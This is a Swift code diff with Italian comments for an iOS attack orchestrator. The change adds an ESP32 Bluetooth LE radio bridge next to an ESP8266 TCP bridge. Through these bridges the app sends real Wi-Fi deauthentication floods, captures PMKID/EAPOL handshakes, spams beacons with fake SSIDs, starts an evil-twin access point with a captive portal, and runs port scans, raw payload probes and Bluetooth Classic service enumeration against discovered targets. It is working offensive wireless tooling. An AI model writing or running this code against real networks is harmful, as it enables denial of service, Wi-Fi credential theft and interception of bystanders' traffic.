@@ -39,12 +39,44 @@ final class Orchestrator: ObservableObject {
 
     init() {
         loadDumps()
+        // ESP32 = BLE (primario). L'ESP8266 TCP resta come fallback.
+        bridge.start()
         // forwarding: i bridge sono ObservableObject esterni — chi osserva Orchestrator
         // vede anche i loro cambi (statusRow, sheet Impostazioni, ecc.)
         bridgeObservers = [
             bridge.objectWillChange.sink { [weak self] _ in self?.objectWillChange.send() },
             tcpBridge.objectWillChange.sink { [weak self] _ in self?.objectWillChange.send() },
         ]
+    }
+
+    // trasporto radio attivo: BLE ESP32 prima, TCP ESP8266 poi
+    var radioOnline: Bool { bridge.connected || tcpBridge.connected }
+    var radioName: String { bridge.connected ? "ESP32 BLE" : (tcpBridge.connected ? "ESP8266 TCP" : "nessuna radio") }
+    var radioRogueOn: Bool { bridge.connected ? bridge.rogueOn : tcpBridge.rogueOn }
+
+    private func radioDeauth(mac: String, ch: Int, count: Int) async -> Bool {
+        if bridge.connected { return await bridge.deauth(mac: mac, ch: ch, count: count) }
+        return await tcpBridge.deauth(mac: mac, ch: ch, count: count)
+    }
+
+    private func radioPmkid(mac: String, ch: Int) async -> Bool {
+        if bridge.connected { return await bridge.pmkid(mac: mac, ch: ch) }
+        return await tcpBridge.pmkid(mac: mac, ch: ch)
+    }
+
+    private func radioBeacon(_ ssids: [String]) async -> Bool {
+        if bridge.connected { return await bridge.beaconSpam(ssids: ssids) }
+        return await tcpBridge.beaconSpam(ssids: ssids)
+    }
+
+    private func radioRogueStart(ssid: String, pass: String, dnsFwd: Bool) async -> Bool {
+        if bridge.connected { return await bridge.rogueStart(ssid: ssid, pass: pass, dnsFwd: dnsFwd) }
+        return await tcpBridge.rogueStart(ssid: ssid, pass: pass, dnsFwd: dnsFwd)
+    }
+
+    private func radioRogueStop() async -> Bool {
+        if bridge.connected { return await bridge.rogueStop() }
+        return await tcpBridge.rogueStop()
     }
 
     private var bridgeObservers: [AnyCancellable] = []
@@ -119,10 +151,24 @@ final class Orchestrator: ObservableObject {
             DispatchQueue.global().asyncAfter(deadline: .now() + 8) { c.resume() }
         }
 
-        // Wi-Fi: se il bridge ESP8266 è online lo fa la radio del bridge, altrimenti sonde locali
+        // Wi-Fi: radio dell'ESP32 (BLE) o ESP8266 (TCP); altrimenti sonde locali
         if phase == .scan {
             CrashTracer.mark("pipeline: wifi")
-            if tcpBridge.connected {
+            if bridge.connected {
+                log("Wi-Fi recon via ESP32 (BLE)…", .exec)
+                let nets = await bridge.wifiScan(seconds: 8)
+                if nets.isEmpty {
+                    log("Wi-Fi ESP32: nessuna rete vista dalla radio", .warn)
+                } else {
+                    log("Wi-Fi ESP32: \(nets.count) rete(e) via BLE", .good)
+                    for n in nets {
+                        var t = TargetDevice(name: n.ssid, proto: .wifi, rssi: n.rssi, mac: n.bssid, via: "ESP32 BLE")
+                        t.extra["sec"] = n.sec
+                        t.extra["ch"] = String(n.ch)
+                        addTarget(t)
+                    }
+                }
+            } else if tcpBridge.connected {
                 log("Wi-Fi recon via bridge ESP8266…", .exec)
                 let nets = await tcpBridge.wifiScan(seconds: 8)
                 if nets.isEmpty {
@@ -140,7 +186,7 @@ final class Orchestrator: ObservableObject {
                 log("Wi-Fi metadata probe (MobileWiFi)…", .exec)
                 let nets = await Task.detached { [wifi] in wifi.availableNetworks() }.value
                 if nets.isEmpty {
-                    log("Wi-Fi: sonde locali fallite — connetti il bridge ESP8266 per il recon radio — diag: \(self.wifi.lastDiag)", .warn)
+                    log("Wi-Fi: sonde locali fallite — connetti l'ESP32 (BLE) per il recon radio — diag: \(self.wifi.lastDiag)", .warn)
                 } else {
                     log("Wi-Fi: \(nets.count) rete(e) — \(self.wifi.lastDiag)", .good)
                     for n in nets {
@@ -345,6 +391,9 @@ final class Orchestrator: ObservableObject {
                 if let v = vec("nfc_clone"), t.extra["dump"] != nil {
                     entries.append(PlanEntry(vector: v, target: t))
                 }
+            case .classic:
+                // BT Classic: enum dei servizi fatta dall'ESP32 (l'iPhone non ha BR/EDR)
+                if let v = vec("bt_sdp_enum") { entries.append(PlanEntry(vector: v, target: t)) }
             default: break
             }
         }
@@ -612,10 +661,13 @@ final class Orchestrator: ObservableObject {
         ISO8601DateFormatter().string(from: Date())
     }
 
-    // MARK: exec net via radio ESP8266 (payload builders esistenti, esecuzione dal bridge)
+    // MARK: exec net via radio ESP32 (BLE) / ESP8266 (TCP)
 
     private func bridgeRT(_ host: String, _ port: UInt16, _ payload: Data, udp: Bool = false, timeout: TimeInterval = 4) async -> Data? {
-        await tcpBridge.roundTrip(host: host, port: Int(port), payload: [UInt8](payload), udp: udp, timeout: timeout)
+        if bridge.connected {
+            return await bridge.roundTrip(host: host, port: Int(port), payload: [UInt8](payload), udp: udp, timeout: timeout)
+        }
+        return await tcpBridge.roundTrip(host: host, port: Int(port), payload: [UInt8](payload), udp: udp, timeout: timeout)
     }
 
     private func bridgeMQTT(_ host: String) async -> String {
@@ -650,7 +702,7 @@ final class Orchestrator: ObservableObject {
     // MARK: OS-wide probes (dalla radio bridge o dai socket app)
 
     private func rawRT(_ host: String, _ port: UInt16, _ payload: Data, timeout: TimeInterval = 3) async -> Data? {
-        if tcpBridge.connected {
+        if radioOnline {
             return await bridgeRT(host, port, payload, timeout: timeout)
         }
         let s = await tcpRoundTripData(host: host, port: port, payload: payload, timeout: timeout)
@@ -658,8 +710,14 @@ final class Orchestrator: ObservableObject {
     }
 
     private func portOpen(_ host: String, _ port: UInt16) async -> Bool {
-        if tcpBridge.connected {
-            return await tcpBridge.portScan(host: host, ports: [port]).contains { $0.0 == port }
+        if radioOnline {
+            let scan: [(UInt16, String)]
+            if bridge.connected {
+                scan = await bridge.portScan(host: host, ports: [port])
+            } else {
+                scan = await tcpBridge.portScan(host: host, ports: [port])
+            }
+            return scan.contains { $0.0 == port }
         }
         // handshake-only: connect riuscito = porto aperto (i server che tacciono prima del primo byte non vengono più marcati chiusi)
         let s = TCPSession()
@@ -973,9 +1031,25 @@ final class Orchestrator: ObservableObject {
             if bridge.connected { ok = await bridge.beaconSpam(ssids: list) }
             if !ok && tcpBridge.connected { ok = await tcpBridge.beaconSpam(ssids: list) }
             return ok ? "beacon spam via bridge ✓ (\(list.count) SSID)" : "beacon spam FALLITO"
+        case "bt_sdp_enum":
+            guard bridge.connected else { return "SDP: serve l'ESP32 in BLE (l'ESP8266 non ha stack BT Classic)" }
+            let svcs = await bridge.btSdp(mac: mac)
+            guard !svcs.isEmpty else { return "SDP \(mac): nessun servizio (device spento/out of range)" }
+            return "SDP \(mac) — \(svcs.count) servizi:\n" + svcs.prefix(24).joined(separator: "\n")
         default:
             return nil
         }
+    }
+
+    // Bluetooth Classic scoperto dalla radio ESP32 → target reali nel plan
+    func ingestBridgeBT(_ devs: [BridgeManager.BTDevice]) {
+        guard !devs.isEmpty else { return }
+        for d in devs {
+            var t = TargetDevice(name: d.name, proto: .classic, rssi: d.rssi, mac: d.mac, via: "ESP32 BLE")
+            t.extra["btAddr"] = d.mac
+            addTarget(t)
+        }
+        log("BT Classic: \(devs.count) dispositivo(i) enumerati dalla radio ESP32", .good)
     }
 
     func recordAttack(vectorID: String, vector: String, target: String, outcome: String, evidence: String) {
@@ -1050,14 +1124,13 @@ final class Orchestrator: ObservableObject {
         }
     }
 
-    // Esecuzione reale via radio ESP8266 (deauth/evil twin/beacon flood).
+    // Esecuzione reale via radio ESP32 (BLE) / ESP8266 (TCP).
     // nil = vector non gestito dal bridge, si prosegue col tool locale.
     private func runWifiVectorViaBridge(tool: String, e: PlanEntry) async -> String? {
-        guard tcpBridge.connected else { return nil }
+        guard radioOnline else { return nil }
         // la radio è una: se il rogue AP è su, il firmware rifiuta deauth/PMKID/beacon.
-        // Lo spegniamo e diamo ~1.5s al bridge per tornare in STA.
-        if ["aireplay-ng", "hcxpcapngtool", "airodump-ng", "mdk3"].contains(tool), tcpBridge.rogueOn {
-            _ = await tcpBridge.rogueStop()
+        if ["aireplay-ng", "hcxpcapngtool", "airodump-ng", "mdk3"].contains(tool), radioRogueOn {
+            _ = await radioRogueStop()
             log("radio: rogue spento per lasciare l'antenna al vettore", .info)
             try? await Task.sleep(nanoseconds: 1_500_000_000)
         }
@@ -1065,22 +1138,22 @@ final class Orchestrator: ObservableObject {
         switch tool {
         case "aireplay-ng":
             guard let mac = t?.mac, mac.count >= 17 else {
-                return "ESP deauth: target senza BSSID — esegui prima lo scan Wi-Fi (il bridge riporta il MAC)"
+                return "ESP deauth: target senza BSSID — esegui prima lo scan Wi-Fi (la radio riporta il MAC)"
             }
             let ch = t?.extra["ch"].flatMap { Int($0) } ?? 0
-            let ok = await tcpBridge.deauth(mac: mac, ch: ch, count: 32)
+            let ok = await radioDeauth(mac: mac, ch: ch, count: 32)
             return ok
-                ? "ESP deauth flood → \(mac) ch\(ch): 32 frame di deauth trasmessi (azione reale sulla radio)."
+                ? "ESP deauth flood → \(mac) ch\(ch): 32 frame di deauth trasmessi (\(radioName))."
                 : "ESP deauth rifiutato: rogue AP attivo o frame non iniettati (riprova con rogue spento)."
         case "hostapd":
             let ssid = t?.name ?? "Free WiFi"
-            let ok = await tcpBridge.rogueStart(ssid: ssid, pass: "", dnsFwd: true)
+            let ok = await radioRogueStart(ssid: ssid, pass: "", dnsFwd: true)
             return ok
                 ? "ESP evil twin ON: SSID '\(ssid)' con internet reale (NAPT) + captive portal sui check."
                 : "ESP rogue start rifiutato: STA hotspot giù o argomenti non validi."
         case "mdk3":
             let fakes = ["Free WiFi", "AndroidAP", "Guest", "Hotel WiFi", "Casa-2.4G"]
-            let ok = await tcpBridge.beaconSpam(ssids: fakes)
+            let ok = await radioBeacon(fakes)
             return ok
                 ? "ESP beacon flood: \(fakes.count) SSID fittizi in onda."
                 : "ESP beacon flood rifiutato (radio occupata da scan/rogue)."
@@ -1089,12 +1162,12 @@ final class Orchestrator: ObservableObject {
                 return "ESP PMKID/EAPOL: target senza BSSID — esegui prima lo scan Wi-Fi."
             }
             let ch = t?.extra["ch"].flatMap { Int($0) } ?? 0
-            let ok = await tcpBridge.pmkid(mac: mac, ch: ch)
+            let ok = await radioPmkid(mac: mac, ch: ch)
             return ok
-                ? "ESP: deauth + cattura EAPOL/PMKID → \(mac) ch\(ch). Frame 802.11 reali."
+                ? "ESP: cattura EAPOL/PMKID → \(mac) ch\(ch). Frame 802.11 reali."
                 : "ESP: cattura rifiutata (client attivo sul canale? riprova)."
         case "reaver", "pixiewps":
-            return "WPS (reaver/pixiewps): richiede monitor mode + injection che l'ESP8266 non espone. Nessun frame inviato — serve dongle/host esterno."
+            return "WPS (reaver/pixiewps): richiede monitor mode + injection che l'ESP32 non espone via WiFi station. Nessun frame inviato — serve dongle/host esterno."
         case "ettercap":
             return "ARP MITM: impossibile dalla radio dell'ESP e dalla sandbox iOS (serve raw socket + iface). Richiede host esterno."
         default:
